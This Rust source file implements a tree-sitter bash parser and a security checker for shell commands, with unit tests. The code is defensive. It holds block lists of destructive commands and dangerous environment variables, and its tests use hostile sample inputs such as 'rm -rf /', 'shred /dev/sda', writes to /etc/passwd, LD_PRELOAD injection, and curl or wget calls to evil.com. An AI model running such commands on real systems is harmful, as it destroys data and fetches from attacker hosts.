//! Tree-sitter based bash command parser.
//!
//! Parses bash commands into an AST and extracts structured information
//! for security analysis. Catches obfuscation that regex-based detection
//! misses: quote splitting, command substitution, variable indirection,
//! subshells, and process substitution.

use tree_sitter::{Language, Node, Parser};

/// Parsed representation of a bash command for security analysis.
#[derive(Debug, Default, Clone)]
pub struct ParsedCommand {
    /// Original command string, kept for substring-style scans.
    pub raw: String,
    /// Top-level command names (the actual binaries being run).
    pub commands: Vec<String>,
    /// Full argument vector for each command, in source order: the
    /// command name followed by its arguments, with prefix variable
    /// assignments and redirections removed.
    ///
    /// Effect classification is argument-dependent for several binaries
    /// (`git push` vs `git status`, `find -delete` vs `find -name`), so
    /// the name alone is not enough to decide whether an invocation is
    /// read-only. Parallel to [`Self::commands`]: entry `i` of this list
    /// starts with entry `i` of that one.
    pub invocations: Vec<Vec<String>>,
    /// Variable assignments (FOO=bar).
    pub assignments: Vec<(String, String)>,
    /// Command substitutions ($(...) or `...`).
    pub substitutions: Vec<String>,
    /// Redirections (>, >>, <, 2>).
    pub redirections: Vec<String>,
    /// Whether the command uses pipes.
    pub has_pipes: bool,
    /// Whether the command chains with && or ||.
    pub has_chains: bool,
    /// Whether the command uses subshells ((...) or $(...)).
    pub has_subshell: bool,
    /// Whether the command uses process substitution <(...) or >(...).
    pub has_process_substitution: bool,
    /// Raw command strings from each pipeline segment.
    pub pipeline_segments: Vec<String>,
    /// Source text of every `command` node, in AST order — one entry per
    /// invocation including the ones inside chains, pipes and subshells.
    /// Unlike [`Self::commands`] (bare binary names) this keeps the
    /// arguments, which argument-sensitive gates need.
    pub command_texts: Vec<String>,
    /// Whether tree-sitter reported a syntax error or a missing node
    /// anywhere in the tree. A command that did not parse cleanly cannot
    /// be analysed, so safety gates must treat it as unknown.
    pub has_parse_error: bool,
}

/// Parse a bash command string into a structured representation.
pub fn parse_bash(command: &str) -> Option<ParsedCommand> {
    let mut parser = Parser::new();
    let language = tree_sitter_bash::LANGUAGE;
    parser.set_language(&Language::from(language)).ok()?;

    let tree = parser.parse(command, None)?;
    let root = tree.root_node();

    let mut parsed = ParsedCommand {
        raw: command.to_string(),
        has_parse_error: root.has_error(),
        ..ParsedCommand::default()
    };
    extract_from_node(root, command.as_bytes(), &mut parsed);
    Some(parsed)
}

/// Recursively walk the AST and extract command information.
fn extract_from_node(node: Node, source: &[u8], parsed: &mut ParsedCommand) {
    match node.kind() {
        "command" => {
            parsed.command_texts.push(node_text(node, source));
            // Extract the command name (first child that's a "command_name" or "word").
            if let Some(name_node) = node.child_by_field_name("name") {
                let name = node_text(name_node, source);
                parsed.commands.push(name);
            } else {
                // Fallback: first word child.
                for i in 0..node.child_count() {
                    let child = node.child(i as u32).unwrap();
                    if child.kind() == "word" || child.kind() == "command_name" {
                        parsed.commands.push(node_text(child, source));
                        break;
                    }
                }
            }
            let argv = command_argv(node, source);
            if !argv.is_empty() {
                parsed.invocations.push(argv);
            }
        }
        "variable_assignment" => {
            let name = node
                .child_by_field_name("name")
                .map(|n| node_text(n, source))
                .unwrap_or_default();
            let value = node
                .child_by_field_name("value")
                .map(|n| node_text(n, source))
                .unwrap_or_default();
            parsed.assignments.push((name, value));
        }
        "command_substitution" => {
            let text = node_text(node, source);
            parsed.substitutions.push(text);
            parsed.has_subshell = true;
        }
        "process_substitution" => {
            parsed.has_process_substitution = true;
        }
        "pipeline" => {
            parsed.has_pipes = true;
            // Extract each command in the pipeline.
            for i in 0..node.child_count() {
                let child = node.child(i as u32).unwrap();
                if child.kind() == "command" || child.kind() == "pipeline" {
                    let text = node_text(child, source);
                    parsed.pipeline_segments.push(text);
                }
            }
        }
        "list" => {
            // && and || chains.
            for i in 0..node.child_count() {
                let child = node.child(i as u32).unwrap();
                let kind = child.kind();
                if kind == "&&" || kind == "||" {
                    parsed.has_chains = true;
                }
            }
        }
        "redirected_statement" | "file_redirect" | "heredoc_redirect" => {
            let text = node_text(node, source);
            parsed.redirections.push(text);
        }
        "subshell" => {
            parsed.has_subshell = true;
        }
        _ => {}
    }

    // Recurse into children.
    for i in 0..node.child_count() {
        if let Some(child) = node.child(i as u32) {
            extract_from_node(child, source, parsed);
        }
    }
}

/// Get text content of a node.
fn node_text(node: Node, source: &[u8]) -> String {
    node.utf8_text(source).unwrap_or("").to_string()
}

/// Collect the argument vector of a `command` node: the command name
/// plus every argument, skipping prefix variable assignments and
/// redirections (which are analysed separately).
fn command_argv(node: Node, source: &[u8]) -> Vec<String> {
    let mut argv = Vec::new();
    for i in 0..node.child_count() {
        let Some(child) = node.child(i as u32) else {
            continue;
        };
        match child.kind() {
            "variable_assignment"
            | "file_redirect"
            | "heredoc_redirect"
            | "herestring_redirect" => {}
            _ => {
                let text = node_text(child, source);
                if !text.is_empty() {
                    argv.push(text);
                }
            }
        }
    }
    argv
}

/// Strip one layer of shell quoting/escaping from a single token so
/// option matching cannot be defeated by writing `-'delete'` or
/// `-dele\te`.
///
/// Follows shell rules closely enough for matching: inside single
/// quotes a backslash is literal; elsewhere `\x` yields `x`.
pub fn unquote_token(raw: &str) -> String {
    let mut out = String::with_capacity(raw.len());
    let mut chars = raw.chars().peekable();
    let mut quote: Option<char> = None;
    while let Some(c) = chars.next() {
        match quote {
            Some('\'') => {
                if c == '\'' {
                    quote = None;
                } else {
                    out.push(c);
                }
            }
            Some('"') => match c {
                '"' => quote = None,
                '\\' => {
                    if let Some(next) = chars.next() {
                        out.push(next);
                    }
                }
                _ => out.push(c),
            },
            Some(_) => unreachable!("only ' and \" open a quote"),
            None => match c {
                '\'' | '"' => quote = Some(c),
                '\\' => {
                    if let Some(next) = chars.next() {
                        out.push(next);
                    }
                }
                _ => out.push(c),
            },
        }
    }
    out
}

/// Strip a leading path from an already-unquoted command name.
pub fn base_name(name: &str) -> String {
    name.rsplit('/').next().unwrap_or(name).to_string()
}

/// Commands whose job is to run the command that follows them, so the
/// wrapper name says nothing about what actually executes.
const COMMAND_WRAPPERS: &[&str] = &["env", "command", "nohup", "setsid"];

/// True when `tok` is a `NAME=value` environment assignment.
pub fn is_env_assignment(tok: &str) -> bool {
    match tok.split_once('=') {
        Some((name, _)) => {
            !name.is_empty()
                && name.starts_with(|c: char| c.is_ascii_alphabetic() || c == '_')
                && name
                    .chars()
                    .all(|c| c.is_ascii_alphanumeric() || c == '_' || c == '.')
        }
        None => false,
    }
}

/// For a wrapper invocation (`env`, `command`, `nohup`, `setsid`),
/// return the base name of the command it would run. `None` when the
/// head is not a wrapper or no wrapped command can be identified.
fn unwrapped_head(argv: &[String]) -> Option<String> {
    let mut tokens: Vec<String> = argv.iter().map(|a| unquote_token(a)).collect();
    let mut unwrapped = false;
    for _ in 0..8 {
        let head = base_name(tokens.first()?);
        if !COMMAND_WRAPPERS.contains(&head.as_str()) {
            return unwrapped.then_some(head);
        }
        let idx = tokens[1..]
            .iter()
            .position(|tok| !tok.starts_with('-') && !is_env_assignment(tok))?;
        tokens = tokens.split_off(1 + idx);
        unwrapped = true;
    }
    None
}

/// For each invocation, the text with any leading wrapper chain
/// (`env`, `command`, `nohup`, `setsid` — plus their flags and
/// VAR=value assignments) stripped: `env -i git status` yields
/// `git status`. Only invocations that actually had a wrapper are
/// returned. Lets restrictive permission rules keep matching a
/// command that has been wrapped — the widening side never uses
/// this, so unwrapping can only remove permissions, never grant.
pub fn unwrapped_invocation_texts(parsed: &ParsedCommand) -> Vec<String> {
    let mut out = Vec::new();
    for argv in &parsed.invocations {
        let mut tokens: Vec<String> = argv.iter().map(|a| unquote_token(a)).collect();
        let mut unwrapped = false;
        for _ in 0..8 {
            let Some(first) = tokens.first() else { break };
            if !COMMAND_WRAPPERS.contains(&base_name(first).as_str()) {
                break;
            }
            let Some(idx) = tokens[1..]
                .iter()
                .position(|tok| !tok.starts_with('-') && !is_env_assignment(tok))
            else {
                break;
            };
            tokens = tokens.split_off(1 + idx);
            unwrapped = true;
        }
        if unwrapped && !tokens.is_empty() {
            out.push(tokens.join(" "));
        }
    }
    out
}

/// Check a parsed command against security rules.
/// Returns a list of security violations found.
pub fn check_parsed_security(parsed: &ParsedCommand) -> Vec<String> {
    let mut violations = Vec::new();

    // Check each command name against dangerous commands.
    const DANGEROUS_COMMANDS: &[&str] = &[
        "rm", "shred", "dd", "mkfs", "wipefs", "shutdown", "reboot", "halt", "poweroff", "kill",
        "killall", "pkill",
    ];

    // Command names, plus the command each `env`-style wrapper runs —
    // `env rm x` must be seen as `rm`, not as `env`.
    let mut heads: Vec<String> = parsed
        .commands
        .iter()
        .map(|c| base_name(&unquote_token(c)))
        .collect();
    for argv in &parsed.invocations {
        if let Some(inner) = unwrapped_head(argv) {
            heads.push(inner);
        }
    }

    for base in &heads {
        if DANGEROUS_COMMANDS.contains(&base.as_str()) {
            violations.push(format!(
                "Dangerous command '{base}' detected in AST (not bypassable with quoting tricks)"
            ));
        }
    }

    // Check for dangerous variable assignments.
    const DANGEROUS_VARS: &[&str] = &[
        "PATH",
        "LD_PRELOAD",
        "LD_LIBRARY_PATH",
        "PROMPT_COMMAND",
        "BASH_ENV",
        "ENV",
        "IFS",
        "CDPATH",
        "GLOBIGNORE",
    ];

    for (name, _value) in &parsed.assignments {
        if DANGEROUS_VARS.contains(&name.as_str()) {
            violations.push(format!(
                "Dangerous variable assignment: {name}= (detected via AST, not bypassable)"
            ));
        }
    }

    // Check for command substitutions containing dangerous commands.
    for sub in &parsed.substitutions {
        let sub_lower = sub.to_lowercase();
        if sub_lower.contains("curl")
            || sub_lower.contains("wget")
            || sub_lower.contains("nc ")
            || sub_lower.contains("ncat")
        {
            violations.push(format!(
                "Network command in substitution: {sub} (data exfiltration risk)"
            ));
        }
    }

    // Check for suspicious redirections to system paths.
    for redir in &parsed.redirections {
        if redir.contains("/dev/sd")
            || redir.contains("/dev/null") && redir.contains("2>")
            || redir.contains("/etc/")
            || redir.contains("/usr/")
        {
            // /dev/null stderr redirect is fine, but writing to /dev/sd* or /etc/ is not.
            if !redir.contains("/dev/null") {
                violations.push(format!("Suspicious redirection to system path: {redir}"));
            }
        }
    }

    // Check for eval-like patterns with variables.
    for cmd in &parsed.commands {
        if cmd == "eval" && !parsed.assignments.is_empty() {
            violations.push(
                "eval with variable assignments in same command (arbitrary code execution)".into(),
            );
        }
    }

    violations
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_parse_simple_command() {
        let parsed = parse_bash("ls -la").unwrap();
        assert!(parsed.commands.contains(&"ls".to_string()));
    }

    #[test]
    fn test_parse_pipe() {
        let parsed = parse_bash("cat file.txt | grep pattern").unwrap();
        assert!(parsed.has_pipes);
        assert!(parsed.commands.contains(&"cat".to_string()));
        assert!(parsed.commands.contains(&"grep".to_string()));
    }

    #[test]
    fn test_parse_chain() {
        let parsed = parse_bash("echo hello && echo world").unwrap();
        assert!(parsed.has_chains);
    }

    #[test]
    fn test_parse_variable_assignment() {
        let parsed = parse_bash("FOO=bar echo test").unwrap();
        assert!(!parsed.assignments.is_empty());
        assert_eq!(parsed.assignments[0].0, "FOO");
    }

    #[test]
    fn test_parse_command_substitution() {
        let parsed = parse_bash("echo $(whoami)").unwrap();
        assert!(!parsed.substitutions.is_empty());
        assert!(parsed.has_subshell);
    }

    #[test]
    fn test_parse_redirection() {
        let parsed = parse_bash("echo hello > output.txt").unwrap();
        assert!(!parsed.redirections.is_empty());
    }

    #[test]
    fn test_detect_dangerous_command() {
        let parsed = parse_bash("rm -rf /tmp/test").unwrap();
        let violations = check_parsed_security(&parsed);
        assert!(!violations.is_empty());
        assert!(violations[0].contains("rm"));
    }

    #[test]
    fn test_detect_quoted_dangerous_command() {
        // Tree-sitter sees through quotes to the actual command, and the
        // name is unquoted before it is matched, so the quoting trick
        // does not hide `rm`.
        let parsed = parse_bash("'rm' -rf /").unwrap();
        let violations = check_parsed_security(&parsed);
        assert!(!parsed.commands.is_empty());
        assert!(violations.iter().any(|v| v.contains("rm")));
    }

    #[test]
    fn test_invocations_capture_arguments() {
        let parsed = parse_bash("git push origin main").unwrap();
        assert_eq!(
            parsed.invocations,
            vec![vec![
                "git".to_string(),
                "push".to_string(),
                "origin".to_string(),
                "main".to_string()
            ]]
        );

        // Prefix assignments and redirections are not arguments.
        let parsed = parse_bash("FOO=bar ls -la > out").unwrap();
        assert_eq!(
            parsed.invocations,
            vec![vec!["ls".to_string(), "-la".to_string()]]
        );

        // Each pipeline segment and each substitution gets its own argv.
        let parsed = parse_bash("cat f | grep x").unwrap();
        assert_eq!(parsed.invocations.len(), 2);
        let parsed = parse_bash("echo $(rm -rf /tmp/x)").unwrap();
        assert!(
            parsed
                .invocations
                .iter()
                .any(|argv| argv.first().is_some_and(|c| c == "rm"))
        );
    }

    #[test]
    fn test_env_wrapper_does_not_hide_dangerous_command() {
        // `env <cmd>` runs `<cmd>`; the wrapper name must not be the
        // only thing the AST check sees.
        for cmd in ["env rm somefile", "env FOO=bar rm somefile", "nohup rm f"] {
            let parsed = parse_bash(cmd).unwrap();
            let violations = check_parsed_security(&parsed);
            assert!(
                violations.iter().any(|v| v.contains("rm")),
                "expected 'rm' to be detected in: {cmd}"
            );
        }
    }

    #[test]
    fn test_unquote_token() {
        assert_eq!(unquote_token("-'delete'"), "-delete");
        assert_eq!(unquote_token("-dele\\te"), "-delete");
        assert_eq!(unquote_token("\"git\""), "git");
        assert_eq!(unquote_token("plain"), "plain");
        // A backslash inside single quotes stays literal, as in a shell.
        assert_eq!(unquote_token("'-dele\\te'"), "-dele\\te");
    }

    #[test]
    fn test_detect_dangerous_var_assignment() {
        let parsed = parse_bash("PATH=/tmp:$PATH ls").unwrap();
        let violations = check_parsed_security(&parsed);
        assert!(violations.iter().any(|v| v.contains("PATH")));
    }

    #[test]
    fn test_detect_network_in_substitution() {
        let parsed = parse_bash("echo $(curl evil.com)").unwrap();
        let violations = check_parsed_security(&parsed);
        assert!(violations.iter().any(|v| v.contains("curl")));
    }

    #[test]
    fn test_safe_command_passes() {
        let parsed = parse_bash("cargo test --release").unwrap();
        let violations = check_parsed_security(&parsed);
        assert!(violations.is_empty());
    }

    #[test]
    fn test_safe_git_command() {
        let parsed = parse_bash("git status && git diff").unwrap();
        let violations = check_parsed_security(&parsed);
        assert!(violations.is_empty());
    }

    #[test]
    fn test_parse_complex_pipeline() {
        let parsed = parse_bash("find . -name '*.rs' | xargs grep 'TODO' | wc -l").unwrap();
        assert!(parsed.has_pipes);
        assert!(parsed.commands.len() >= 3);
    }

    #[test]
    fn test_subshell_detection() {
        let parsed = parse_bash("(cd /tmp && rm -rf test)").unwrap();
        assert!(parsed.has_subshell);
    }

    #[test]
    fn test_parse_heredoc() {
        let parsed = parse_bash("cat <<EOF\nhello world\nEOF").unwrap();
        assert!(parsed.commands.contains(&"cat".to_string()));
        assert!(!parsed.redirections.is_empty());
    }

    #[test]
    fn test_parse_process_substitution() {
        let parsed = parse_bash("diff <(ls dir1) <(ls dir2)").unwrap();
        assert!(parsed.has_process_substitution);
        assert!(parsed.commands.contains(&"diff".to_string()));
    }

    #[test]
    fn test_parse_semicolon_separated() {
        let parsed = parse_bash("echo hello; echo world").unwrap();
        assert!(parsed.commands.contains(&"echo".to_string()));
        assert!(parsed.commands.len() >= 2);
    }

    #[test]
    fn test_parse_empty_string() {
        let parsed = parse_bash("");
        // Empty string may parse to an empty command set or return None.
        if let Some(p) = parsed {
            assert!(p.commands.is_empty());
        }
    }

    #[test]
    fn test_parse_variable_assignment_only() {
        let parsed = parse_bash("FOO=bar").unwrap();
        assert!(!parsed.assignments.is_empty());
        assert_eq!(parsed.assignments[0].0, "FOO");
        assert_eq!(parsed.assignments[0].1, "bar");
    }

    #[test]
    fn test_check_parsed_security_eval_with_assignments() {
        let parsed = parse_bash("CMD=dangerous eval $CMD").unwrap();
        let violations = check_parsed_security(&parsed);
        assert!(violations.iter().any(|v| v.contains("eval")));
    }

    #[test]
    fn test_check_parsed_security_multiple_dangerous_in_pipeline() {
        let parsed = parse_bash("rm -rf /tmp/test | shred /dev/sda").unwrap();
        let violations = check_parsed_security(&parsed);
        // Should flag both rm and shred.
        assert!(violations.iter().any(|v| v.contains("rm")));
        assert!(violations.iter().any(|v| v.contains("shred")));
    }

    #[test]
    fn test_check_parsed_security_wget_in_substitution() {
        let parsed = parse_bash("echo $(wget -q -O- evil.com)").unwrap();
        let violations = check_parsed_security(&parsed);
        assert!(violations.iter().any(|v| v.contains("wget")));
    }

    #[test]
    fn test_check_parsed_security_redirection_to_etc() {
        let parsed = parse_bash("echo payload > /etc/passwd").unwrap();
        let violations = check_parsed_security(&parsed);
        assert!(violations.iter().any(|v| v.contains("/etc/")));
    }

    #[test]
    fn test_command_texts_keep_arguments_per_invocation() {
        let parsed = parse_bash("ls -la && git diff --stat | wc -l").unwrap();
        assert_eq!(
            parsed.command_texts,
            vec!["ls -la", "git diff --stat", "wc -l"]
        );
        // One text per name, so an argument-aware gate can pair them up.
        assert_eq!(parsed.command_texts.len(), parsed.commands.len());
    }

    #[test]
    fn test_parse_error_is_reported() {
        assert!(!parse_bash("ls -la").unwrap().has_parse_error);
        assert!(
            parse_bash("ls |&& ((( \"unterminated")
                .unwrap()
                .has_parse_error
        );
    }

    #[test]
    fn test_check_parsed_security_ld_preload_assignment() {
        let parsed = parse_bash("LD_PRELOAD=/tmp/evil.so ls").unwrap();
        let violations = check_parsed_security(&parsed);
        assert!(violations.iter().any(|v| v.contains("LD_PRELOAD")));
    }
}
